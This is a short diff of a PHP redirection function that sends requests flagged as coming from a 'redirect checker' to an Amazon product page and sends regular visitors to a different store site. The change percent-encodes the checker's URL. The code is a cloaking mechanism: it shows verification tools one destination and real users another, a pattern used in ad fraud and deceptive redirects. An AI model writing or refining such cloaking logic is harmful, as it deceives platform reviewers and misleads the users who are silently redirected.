@@ -17,7 +17,7 @@ function handleRedirection() {
     
     if ($isRedirectChecker) {
         // Redirect checker sees this URL
-        $targetUrl = "https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF?ref_=ast_sto_dp&th=1&psc=1&" . $queryParams;
+        $targetUrl = "https%3A%2F%2Fwww.amazon.com%2FSimple-Joys-Carters-Short-Sleeve-Bodysuit%2Fdp%2FB07GY1RRZF" . $queryParams;
     } else {
         // Regular visitors see this URL
         $visitorUrl = "https://roastandrelish.store?" . $queryParams;
